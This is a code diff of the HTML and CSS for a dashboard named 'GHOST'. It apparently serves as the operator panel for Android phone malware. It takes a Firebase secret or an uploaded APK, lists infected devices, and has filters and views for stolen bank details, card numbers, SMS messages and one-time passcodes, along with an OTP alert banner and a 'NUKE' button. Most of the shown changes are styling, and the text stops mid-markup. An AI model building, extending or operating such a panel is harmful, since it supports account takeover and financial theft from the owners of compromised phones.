@@ -9,47 +9,29 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <style>
 :root{
-  --bg:#0a0a0b;
-  --bg1:#101012;
-  --bg2:#141417;
-  --bg3:#1a1a1e;
-  --bg4:#202025;
-  --line:rgba(255,255,255,.06);
-  --line2:rgba(255,255,255,.11);
-  --text:#eaeaea;
-  --text2:#a1a1a6;
-  --text3:#67676c;
-  --cy:#5ce1e6;
-  --cy2:#7ee8ed;
-  --cyb:rgba(92,225,230,.12);
-  --cybd:rgba(92,225,230,.3);
-  --gr:#4ade80;
-  --grb:rgba(74,222,128,.12);
-  --rd:#f87171;
-  --rdb:rgba(248,113,113,.12);
-  --pu:#c084fc;
-  --pub:rgba(192,132,252,.12);
-  --or:#fbbf24;
-  --orb:rgba(251,191,36,.12);
+  --bg:#0a0a0b; --bg1:#101012; --bg2:#141417; --bg3:#1a1a1e; --bg4:#202025;
+  --line:rgba(255,255,255,.06); --line2:rgba(255,255,255,.11);
+  --text:#eaeaea; --text2:#a1a1a6; --text3:#67676c;
+  --cy:#5ce1e6; --cy2:#7ee8ed; --cyb:rgba(92,225,230,.12); --cybd:rgba(92,225,230,.3);
+  --gr:#4ade80; --grb:rgba(74,222,128,.12); --grbd:rgba(74,222,128,.28);
+  --rd:#f87171; --rdb:rgba(248,113,113,.12); --rdbd:rgba(248,113,113,.28);
+  --pu:#c084fc; --pub:rgba(192,132,252,.12); --pubd:rgba(192,132,252,.28);
+  --or:#fbbf24; --orb:rgba(251,191,36,.12); --orbd:rgba(251,191,36,.28);
   --mono:'JetBrains Mono',monospace;
 }
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:14px;-webkit-font-smoothing:antialiased;font-feature-settings:"cv11","ss01"}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}
 ::-webkit-scrollbar{width:8px;height:8px}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:4px}
 ::-webkit-scrollbar-thumb:hover{background:#303038}
 button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit;transition:all .16s cubic-bezier(.16,1,.3,1)}
 input,textarea,select{font-family:inherit;color:inherit;outline:none}
-
 @keyframes fup{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
 @keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
 @keyframes slideDn{from{opacity:0;transform:translateY(-100%)}to{opacity:1;transform:translateY(0)}}
-@keyframes spin{to{transform:rotate(360deg)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
-@keyframes skel{0%{background-position:-200% 0}100%{background-position:200% 0}}
 
-/* LOGIN */
 #login{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:var(--bg);padding:24px;z-index:100;overflow-y:auto}
 #login::before{content:'';position:absolute;inset:0;background:
   radial-gradient(1000px 500px at 50% -20%, rgba(92,225,230,.06), transparent 60%),
@@ -82,24 +64,22 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .icon-b{width:28px;height:28px;border-radius:7px;background:var(--bg3);border:1px solid var(--line);display:inline-flex;align-items:center;justify-content:center;color:var(--text3);flex-shrink:0}
 .icon-b:hover{color:var(--text);border-color:var(--line2)}
 .icon-b svg{width:13px;height:13px}
-.icon-b.dng:hover{color:var(--rd);border-color:rgba(248,113,113,.3);background:var(--rdb)}
+.icon-b.dng:hover{color:var(--rd);border-color:var(--rdbd);background:var(--rdb)}
 .drop{padding:22px;border:1.5px dashed var(--line2);border-radius:12px;text-align:center;cursor:pointer;transition:all .18s;background:rgba(92,225,230,.015)}
 .drop:hover,.drop.dg{border-color:var(--cybd);background:var(--cyb)}
 .drop input{display:none}
 .drop-i{width:38px;height:38px;margin:0 auto 10px;border-radius:10px;background:var(--bg3);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;color:var(--text3)}
 .drop-t{font-size:12px;font-weight:600;color:var(--text2)}
 .drop-s{font-size:10px;color:var(--text3);margin-top:3px}
-.err{padding:11px 14px;background:var(--rdb);border:1px solid rgba(248,113,113,.25);border-radius:10px;font-size:12px;color:var(--rd);margin-top:14px;display:none;line-height:1.5}
+.err{padding:11px 14px;background:var(--rdb);border:1px solid var(--rdbd);border-radius:10px;font-size:12px;color:var(--rd);margin-top:14px;display:none;line-height:1.5}
 .err.on{display:block}
 .note{padding:11px 14px;background:var(--cyb);border:1px solid var(--cybd);border-radius:10px;font-size:11px;color:var(--cy2);margin-top:14px;line-height:1.6}
 .note b{color:var(--cy)}
 
-/* APP */
 #app{display:none;flex-direction:column;height:100vh}
 #app.on{display:flex}
 
-/* HEADER */
-.hdr{height:56px;background:rgba(10,10,11,.85);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid var(--line);display:flex;align-items:center;gap:14px;padding:0 20px;flex-shrink:0;position:relative;z-index:40}
+.hdr{height:56px;background:rgba(10,10,11,.85);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid var(--line);display:flex;align-items:center;gap:14px;padding:0 20px;flex-shrink:0;z-index:40}
 .hlogo{display:flex;align-items:center;gap:9px;flex-shrink:0}
 .hmark{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#5ce1e6,#3b82f6);display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(92,225,230,.25)}
 .hmark svg{width:15px;height:15px;color:#0a0a0b}
@@ -111,15 +91,14 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .hsearch input::placeholder{color:var(--text3)}
 .hsearch svg{position:absolute;left:11px;top:50%;transform:translateY(-50%);color:var(--text3);pointer-events:none}
 .hright{margin-left:auto;display:flex;align-items:center;gap:8px}
-.hstat{display:flex;align-items:center;gap:6px;padding:5px 10px;background:var(--grb);border:1px solid rgba(74,222,128,.2);border-radius:7px;font-size:10px;font-weight:700;letter-spacing:1px;color:var(--gr)}
+.hstat{display:flex;align-items:center;gap:6px;padding:5px 10px;background:var(--grb);border:1px solid var(--grbd);border-radius:7px;font-size:10px;font-weight:700;letter-spacing:1px;color:var(--gr)}
 .hdot{width:6px;height:6px;border-radius:50%;background:var(--gr);animation:pulse 2s infinite}
 .hclock{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--text2);background:var(--bg2);border:1px solid var(--line);padding:6px 10px;border-radius:8px}
 .hbtn{padding:6px 11px;background:var(--bg2);border:1px solid var(--line);border-radius:8px;font-size:11px;font-weight:600;color:var(--text2);display:flex;align-items:center;gap:5px}
 .hbtn:hover{color:var(--text);border-color:var(--line2);background:var(--bg3)}
 .hbtn svg{width:13px;height:13px}
-.hbtn.dng:hover{color:var(--rd);border-color:rgba(248,113,113,.3);background:var(--rdb)}
+.hbtn.dng:hover{color:var(--rd);border-color:var(--rdbd);background:var(--rdb)}
 
-/* STATS */
 .stats{background:var(--bg1);border-bottom:1px solid var(--line);padding:12px 20px;display:flex;align-items:center;gap:24px;flex-shrink:0;overflow-x:auto;scrollbar-width:none}
 .stats::-webkit-scrollbar{display:none}
 .st{flex-shrink:0}
@@ -131,45 +110,42 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .fchip:hover{color:var(--text2);border-color:var(--line2)}
 .fchip.on{background:var(--cyb);border-color:var(--cybd);color:var(--cy)}
 .sel{padding:5px 9px;background:var(--bg2);border:1px solid var(--line);border-radius:7px;font-size:10px;font-weight:600;color:var(--text2);cursor:pointer;flex-shrink:0}
-.sel:hover{border-color:var(--line2)}
 
-/* GRID */
 .wrap{flex:1;overflow-y:auto;padding:20px}
 .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(316px,1fr));gap:12px}
 @media(max-width:600px){.grid{grid-template-columns:1fr}}
-.dev{background:var(--bg1);border:1px solid var(--line);border-radius:12px;padding:16px;cursor:pointer;transition:all .2s cubic-bezier(.16,1,.3,1);animation:fup .3s ease both;position:relative;overflow:hidden}
-.dev::before{content:'';position:absolute;top:0;left:16px;right:16px;height:1px;background:linear-gradient(90deg,transparent,transparent)}
+.dev{background:var(--bg1);border:1px solid var(--line);border-radius:12px;padding:16px;cursor:pointer;transition:all .2s cubic-bezier(.16,1,.3,1);animation:fup .3s ease both;position:relative}
+.dev::before{content:'';position:absolute;top:0;left:16px;right:16px;height:1px;background:transparent}
 .dev.on::before{background:linear-gradient(90deg,transparent,var(--gr),transparent)}
 .dev:hover{border-color:var(--line2);background:var(--bg2);transform:translateY(-1px)}
 .dev-h{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
-.dev-a{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative}
-.dev-a.on{background:var(--grb);border:1px solid rgba(74,222,128,.2)}
+.dev-a{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.dev-a.on{background:var(--grb);border:1px solid var(--grbd)}
 .dev-a.off{background:var(--bg3);border:1px solid var(--line)}
 .dev-a svg{width:18px;height:18px}
 .dev-a.on svg{color:var(--gr)}
 .dev-a.off svg{color:var(--text3)}
 .dev-i{flex:1;min-width:0}
-.dev-n{font-size:13px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:-.1px}
-.dev-p{font-family:var(--mono);font-size:12px;color:var(--cy);margin-top:3px;font-weight:600;letter-spacing:.2px}
+.dev-n{font-size:13px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev-p{font-family:var(--mono);font-size:12px;color:var(--cy);margin-top:3px;font-weight:600}
 .dev-sims{display:flex;flex-direction:column;gap:3px;margin-top:6px}
 .simc{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:10px}
-.simb{font-family:'Inter',sans-serif;padding:1px 5px;border-radius:4px;font-size:9px;font-weight:700;letter-spacing:.3px}
+.simb{font-family:'Inter',sans-serif;padding:1px 5px;border-radius:4px;font-size:9px;font-weight:700}
 .simb.s1{background:var(--cyb);border:1px solid var(--cybd);color:var(--cy)}
-.simb.s2{background:var(--pub);border:1px solid rgba(192,132,252,.3);color:var(--pu)}
+.simb.s2{background:var(--pub);border:1px solid var(--pubd);color:var(--pu)}
 .simt{color:var(--text);font-weight:500}
 .simo{color:var(--text3)}
 .dev-id{display:flex;align-items:center;gap:5px;margin-top:6px}
 .dev-idt{font-family:var(--mono);font-size:9px;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px}
 .dev-st{padding:3px 8px;border-radius:6px;font-size:9px;font-weight:700;letter-spacing:.8px;flex-shrink:0;font-family:var(--mono)}
-.dev-st.on{background:var(--grb);color:var(--gr);border:1px solid rgba(74,222,128,.2)}
+.dev-st.on{background:var(--grb);color:var(--gr);border:1px solid var(--grbd)}
 .dev-st.off{background:var(--bg3);color:var(--text3);border:1px solid var(--line)}
 .dev-m{display:flex;gap:6px;padding-top:12px;border-top:1px solid var(--line)}
 .mc{flex:1;padding:7px 4px;background:var(--bg2);border:1px solid var(--line);border-radius:8px;text-align:center;min-width:0}
 .mc-v{font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .mc-l{font-size:8px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--text3);margin-top:3px}
-.dev-bk{margin-top:12px;padding:12px;background:var(--grb);border:1px solid rgba(74,222,128,.18);border-radius:10px}
-.dev-bk-h{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:4px}
-.dev-bk-n{font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:var(--gr)}
+.dev-bk{margin-top:12px;padding:12px;background:var(--grb);border:1px solid var(--grbd);border-radius:10px}
+.dev-bk-n{font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:var(--gr);margin-bottom:4px}
 .dev-bk-v{font-family:var(--mono);font-size:20px;font-weight:700;color:#fff;letter-spacing:-.5px}
 .dev-bk-s{font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:2px}
 .dev-f{display:flex;align-items:center;gap:6px;margin-top:12px;font-family:var(--mono);font-size:10px;color:var(--text3)}
@@ -180,10 +156,7 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .empty svg{width:44px;height:44px;opacity:.25;margin-bottom:12px}
 .empty p{font-size:13px;color:var(--text2)}
 .empty small{font-size:11px;color:var(--text3);display:block;margin-top:6px}
-.skel{background:var(--bg1);border:1px solid var(--line);border-radius:12px;padding:16px}
-.skel-l{background:linear-gradient(90deg,var(--bg2) 0%,var(--bg3) 50%,var(--bg2) 100%);background-size:200% 100%;animation:skel 1.4s infinite;border-radius:6px}
 
-/* DRAWER */
 .ov{position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:none;z-index:100;align-items:stretch;justify-content:flex-end}
 .ov.on{display:flex}
 .dr{width:100%;max-width:520px;background:var(--bg1);border-left:1px solid var(--line);display:flex;flex-direction:column;height:100vh;animation:slideIn .28s cubic-bezier(.16,1,.3,1)}
@@ -215,21 +188,21 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .row-k{font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--text3);flex-shrink:0;min-width:110px;padding-top:2px}
 .row-v{font-size:12px;font-weight:500;text-align:right;color:var(--text);word-break:break-all;flex:1;line-height:1.5}
 .row-v.m{font-family:var(--mono);font-size:11px}
-.alert{padding:14px;background:var(--rdb);border:1px solid rgba(248,113,113,.22);border-radius:11px;margin-bottom:14px}
+.alert{padding:14px;background:var(--rdb);border:1px solid var(--rdbd);border-radius:11px;margin-bottom:14px}
 .alert-l{font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--rd);margin-bottom:5px}
 .alert-b{font-family:var(--mono);font-size:22px;font-weight:700;color:var(--rd);letter-spacing:-.5px}
 .alert-s{font-family:var(--mono);font-size:10px;color:rgba(248,113,113,.6);margin-top:4px}
-.okb{padding:11px 14px;background:var(--grb);border:1px solid rgba(74,222,128,.22);border-radius:11px;margin-bottom:14px}
+.okb{padding:11px 14px;background:var(--grb);border:1px solid var(--grbd);border-radius:11px;margin-bottom:14px}
 .okb-l{font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--gr);margin-bottom:4px}
 .okb-v{font-family:var(--mono);font-size:11px;color:var(--gr)}
 .sect{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text3);margin:16px 0 8px}
-.bk{padding:14px;background:var(--grb);border:1px solid rgba(74,222,128,.18);border-radius:11px;margin-bottom:10px}
+.bk{padding:14px;background:var(--grb);border:1px solid var(--grbd);border-radius:11px;margin-bottom:10px}
 .bk-h{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px;flex-wrap:wrap}
 .bk-n{font-size:11px;font-weight:700;color:var(--gr)}
 .bk-s{font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:6px}
 .bk-d{padding:2px 7px;border-radius:5px;font-size:9px;font-weight:700;font-family:var(--mono)}
-.bk-d.cr{background:var(--grb);color:var(--gr);border:1px solid rgba(74,222,128,.28)}
-.bk-d.db{background:var(--rdb);color:var(--rd);border:1px solid rgba(248,113,113,.28)}
+.bk-d.cr{background:var(--grb);color:var(--gr);border:1px solid var(--grbd)}
+.bk-d.db{background:var(--rdb);color:var(--rd);border:1px solid var(--rdbd)}
 .bk-r{display:flex;align-items:flex-end;justify-content:space-between;gap:12px}
 .bk-l{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);margin-bottom:3px}
 .bk-v{font-family:var(--mono);font-size:22px;font-weight:700;color:#fff;letter-spacing:-.5px}
@@ -239,14 +212,14 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .bk-rw{margin-top:10px;padding-top:10px;border-top:1px solid rgba(74,222,128,.12);font-family:var(--mono);font-size:10px;color:var(--text3);line-height:1.55;word-break:break-word}
 .tags{display:flex;gap:5px;margin-top:8px;flex-wrap:wrap}
 .tg{padding:2px 7px;background:var(--bg3);border:1px solid var(--line);border-radius:5px;font-family:var(--mono);font-size:9px;color:var(--text2)}
-.cd{padding:14px;background:var(--pub);border:1px solid rgba(192,132,252,.18);border-radius:11px;margin-bottom:10px}
+.cd{padding:14px;background:var(--pub);border:1px solid var(--pubd);border-radius:11px;margin-bottom:10px}
 .cd-h{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
 .cd-t{font-size:11px;font-weight:700;color:var(--pu)}
 .cd-n{font-family:var(--mono);font-size:15px;letter-spacing:2px;color:#fff;font-weight:600;margin:6px 0}
 .cd-r{display:flex;gap:16px;margin-top:8px}
 .cd-k{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3)}
 .cd-v{font-family:var(--mono);font-size:11px;color:var(--text);font-weight:600;margin-top:3px}
-.rev{padding:2px 7px;background:var(--pub);border:1px solid rgba(192,132,252,.3);border-radius:5px;font-family:'Inter',sans-serif;font-size:9px;font-weight:700;color:var(--pu);margin-left:5px}
+.rev{padding:2px 7px;background:var(--pub);border:1px solid var(--pubd);border-radius:5px;font-family:'Inter',sans-serif;font-size:9px;font-weight:700;color:var(--pu);margin-left:5px}
 
 .smsbar{padding:10px 20px;background:var(--bg2);border-bottom:1px solid var(--line);display:flex;gap:6px;align-items:center;flex-wrap:wrap;flex-shrink:0;position:sticky;top:0;z-index:5}
 .smsbar input{flex:1;min-width:140px;padding:8px 12px;background:var(--bg1);border:1px solid var(--line);border-radius:8px;font-size:12px;color:var(--text)}
@@ -255,7 +228,7 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .mb{padding:6px 11px;background:var(--bg1);border:1px solid var(--line);border-radius:8px;font-size:10px;font-weight:600;color:var(--text2);white-space:nowrap}
 .mb:hover{border-color:var(--line2);color:var(--text)}
 .mb.on{background:var(--cyb);border-color:var(--cybd);color:var(--cy)}
-.mb.dng:hover{color:var(--rd);border-color:rgba(248,113,113,.3);background:var(--rdb)}
+.mb.dng:hover{color:var(--rd);border-color:var(--rdbd);background:var(--rdb)}
 .slist{padding:14px 20px;display:flex;flex-direction:column;gap:8px}
 .sms{background:var(--bg2);border:1px solid var(--line);border-left:3px solid var(--line2);border-radius:10px;padding:12px;cursor:pointer;transition:all .15s;position:relative}
 .sms:hover{border-color:var(--line2);background:var(--bg3)}
@@ -270,10 +243,10 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .sms-t.gen{background:var(--bg4);color:var(--text2)}
 .sms-s{font-family:var(--mono);font-size:11px;font-weight:600;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--text)}
 .sms-tm{font-family:var(--mono);font-size:9px;color:var(--text3);flex-shrink:0}
-.sms-b{font-size:12px;color:var(--text2);line-height:1.55;word-break:break-word}
-.sms-o{display:inline-block;padding:5px 12px;background:var(--orb);border:1px solid rgba(251,191,36,.28);border-radius:7px;font-family:var(--mono);font-size:16px;font-weight:700;color:var(--or);letter-spacing:3px;margin:6px 0}
+.sms-b{font-size:12px;color:var(--text2);line-height:1.55;word-break:break-word;white-space:pre-wrap}
+.sms-o{display:inline-block;padding:5px 12px;background:var(--orb);border:1px solid var(--orbd);border-radius:7px;font-family:var(--mono);font-size:16px;font-weight:700;color:var(--or);letter-spacing:3px;margin:6px 0}
 .sms-x{position:absolute;top:9px;right:9px;width:24px;height:24px;border-radius:6px;background:transparent;border:1px solid transparent;color:transparent;display:flex;align-items:center;justify-content:center;font-size:12px;transition:all .15s}
-.sms:hover .sms-x{background:var(--rdb);border-color:rgba(248,113,113,.2);color:rgba(248,113,113,.7)}
+.sms:hover .sms-x{background:var(--rdb);border-color:var(--rdbd);color:rgba(248,113,113,.7)}
 .sms-x:hover{background:rgba(248,113,113,.22)!important;color:var(--rd)!important}
 
 .frm{padding:18px 20px}
@@ -293,13 +266,13 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .sblk-h{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--cy);margin-bottom:9px;display:flex;align-items:center;gap:7px}
 .sblk-h::before{content:'';width:2px;height:10px;background:var(--cy);border-radius:2px}
 .sblk p{font-size:11px;color:var(--text3);line-height:1.6;margin-bottom:10px}
-.stat2{margin-top:10px;padding:8px 12px;background:var(--grb);border:1px solid rgba(74,222,128,.22);border-radius:8px;font-size:11px;color:var(--gr);font-weight:600;display:none}
+.stat2{margin-top:10px;padding:8px 12px;background:var(--grb);border:1px solid var(--grbd);border-radius:8px;font-size:11px;color:var(--gr);font-weight:600;display:none}
 .stat2.on{display:block}
 
 .toasts{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;z-index:9999;pointer-events:none;align-items:center}
 .tst{padding:10px 18px;background:var(--bg3);border:1px solid var(--line2);border-radius:24px;font-size:12px;font-weight:600;color:var(--text);backdrop-filter:blur(20px);animation:fup .22s ease;box-shadow:0 10px 32px rgba(0,0,0,.5)}
-.tst.ok{background:var(--grb);border-color:rgba(74,222,128,.3);color:var(--gr)}
-.tst.err{background:var(--rdb);border-color:rgba(248,113,113,.3);color:var(--rd)}
+.tst.ok{background:var(--grb);border-color:var(--grbd);color:var(--gr)}
+.tst.err{background:var(--rdb);border-color:var(--rdbd);color:var(--rd)}
 
 .otpb{position:fixed;top:0;left:0;right:0;z-index:9998;padding:14px 22px;background:linear-gradient(90deg,#1a1408,#241a08);border-bottom:2px solid var(--or);display:none;align-items:center;gap:18px;animation:slideDn .3s ease}
 .otpb.on{display:flex}
@@ -330,7 +303,6 @@ input,textarea,select{font-family:inherit;color:inherit;outline:none}
 .ns{flex:1;padding:12px;background:var(--bg2);border:1px solid var(--line);border-radius:9px;text-align:center}
 .ns-v{font-family:var(--mono);font-size:24px;font-weight:700}
 .ns-l{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);margin-top:3px}
-
 .raw{margin-top:12px;padding:12px;background:#050506;border:1px solid var(--line);border-radius:9px;font-family:var(--mono);font-size:10px;color:var(--cy2);line-height:1.6;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-all}
 .dbgbtn{width:100%;padding:10px;background:var(--bg2);border:1px solid var(--line);border-radius:9px;font-size:11px;font-weight:600;color:var(--text2);margin-top:12px}
 .dbgbtn:hover{border-color:var(--cybd);color:var(--cy)}
@@ -380,9 +352,7 @@ window.GHOST_CONFIG = {
       <div class="lsep"></div>
       <div class="lsec">Quick Setup · APK</div>
       <div class="drop" id="dropZone" onclick="document.getElementById('apkInput').click()">
-        <div class="drop-i">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/></svg>
-        </div>
+        <div class="drop-i"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/></svg></div>
         <div class="drop-t">Drop APK here</div>
         <div class="drop-s">Auto-extracts Firebase URL & key</div>
         <input type="file" id="apkInput" accept=".apk,.zip">
@@ -393,9 +363,9 @@ window.GHOST_CONFIG = {
       <label class="lbl">Firebase Database URL</label>
       <input type="text" class="inp" id="inpUrl" placeholder="https://project.firebaseio.com" autocomplete="off" spellcheck="false">
       <label class="lbl" style="margin-top:12px">Database Secret</label>
-      <input type="text" class="inp" id="inpKey" placeholder="Database Secret from Firebase Console" autocomplete="off" spellcheck="false">
+      <input type="text" class="inp" id="inpKey" placeholder="Database Secret" autocomplete="off" spellcheck="false">
       <button class="btn" id="btnGo" onclick="G.login()">Connect</button>
-      <div class="note">Use <b>Database Secret</b> (Project Settings → Service Accounts → Database Secrets). API keys starting with <b>AIza...</b> will fail.</div>
+      <div class="note">Use <b>Database Secret</b> from Firebase Console → Project Settings → Service Accounts → Database Secrets.</div>
     </div>
 
     <div class="err" id="errBox"></div>
@@ -405,30 +375,19 @@ window.GHOST_CONFIG = {
 <div id="app">
   <div class="hdr">
     <div class="hlogo">
-      <div class="hmark">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M12 2C7 2 3 6 3 11v9l3-2 3 2 3-2 3 2 3-2 3 2v-9c0-5-4-9-9-9z"/></svg>
-      </div>
+      <div class="hmark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M12 2C7 2 3 6 3 11v9l3-2 3 2 3-2 3 2 3-2 3 2v-9c0-5-4-9-9-9z"/></svg></div>
       <span class="hname">GH<span>O</span>ST</span>
     </div>
     <div class="hsearch">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.3-4.3"/></svg>
-      <input type="text" id="searchInp" placeholder="Search devices, phone, ID..." oninput="G.render()">
+      <input type="text" id="searchInp" placeholder="Search phone, ID, bank..." oninput="G.render()">
     </div>
     <div class="hright">
       <div class="hstat"><span class="hdot"></span>LIVE</div>
       <div class="hclock" id="clock">00:00:00</div>
-      <button class="hbtn" onclick="G.openBulk()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M4 22h12a2 2 0 0 0 2-2V7l-5-5H4a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2z"/></svg>
-        BULK
-      </button>
-      <button class="hbtn dng" onclick="G.openNuke()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
-        NUKE
-      </button>
-      <button class="hbtn" onclick="G.logout()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
-        LOGOUT
-      </button>
+      <button class="hbtn" onclick="G.openBulk()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M4 22h12a2 2 0 0 0 2-2V7l-5-5H4a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2z"/></svg>BULK</button>
+      <button class="hbtn dng" onclick="G.openNuke()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>NUKE</button>
+      <button class="hbtn" onclick="G.logout()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>LOGOUT</button>
     </div>
   </div>
 
@@ -445,33 +404,30 @@ window.GHOST_CONFIG = {
       <button class="fchip" data-f="offline" onclick="G.setFilter('offline')">Offline</button>
       <button class="fchip" data-f="bank" onclick="G.setFilter('bank')">Bank</button>
       <button class="fchip" data-f="card" onclick="G.setFilter('card')">Card</button>
-      <button class="fchip" data-f="sms" onclick="G.setFilter('sms')">SMS</button>
+      <button class="fchip" data-f="otp" onclick="G.setFilter('otp')">OTP</button>
+      <button class="fchip" data-f="phone" onclick="G.setFilter('phone')">Phone</button>
       <select class="sel" id="sortSel" onchange="G.render()">
         <option value="new">Newest</option>
         <option value="old">Oldest</option>
-        <option value="name">Name</option>
         <option value="bat">Battery</option>
+        <option value="msgs">Messages</option>
       </select>
     </div>
   </div>
 
-  <div class="wrap">
-    <div class="grid" id="grid"></div>
-  </div>
+  <div class="wrap"><div class="grid" id="grid"></div></div>
 </div>
 
 <div class="ov" id="drOv" onclick="if(event.target===this)G.closeDrawer()">
   <div class="dr" onclick="event.stopPropagation()">
     <div class="dr-h">
-      <div class="dr-a">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect width="14" height="20" x="5" y="2" rx="2"/><path d="M12 18h.01"/></svg>
-      </div>
+      <div class="dr-a"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect width="14" height="20" x="5" y="2" rx="2"/><path d="M12 18h.01"/></svg></div>
       <div class="dr-i">
         <div class="dr-n" id="dName">—</div>
         <div class="dr-s" id="dPhone">—</div>
       </div>
       <div class="dr-x">
-        <button class="icon-b dng" onclick="G.deleteDevice()" title="Delete device">
+        <button class="icon-b dng" onclick="G.deleteDevice()" title="Delete">
